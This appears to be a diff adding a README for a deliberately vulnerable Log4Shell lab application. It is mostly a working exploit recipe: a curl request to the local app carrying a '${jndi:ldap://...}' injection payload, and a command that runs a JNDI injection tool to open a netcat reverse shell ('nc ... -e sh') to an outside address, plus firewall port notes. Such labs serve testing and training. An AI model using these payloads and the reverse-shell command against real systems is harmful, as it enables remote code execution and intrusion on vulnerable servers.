@@ -1,0 +1,14 @@
+Based on https://github.com/christophetd/log4shell-vulnerable-app.git
+
+Start with docker-compose --compatibility up -d
+
+Testing that it works:
+
+	curl http://localhost:1214/signPetition -d 'name=x&message=x&recipient=${jndi:ldap://10.176.71.35:1389/xxxxxxx}'
+
+Full exploit with reverse shell on 10.176.71.35 port 1234
+using https://github.com/welk1n/JNDI-Injection-Exploit.git:
+
+	java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'nc -v 10.176.71.35 1234 -e sh' -A 10.176.71.35
+
+make sure ports 1234, 1389 and 8180 are open in the firewall
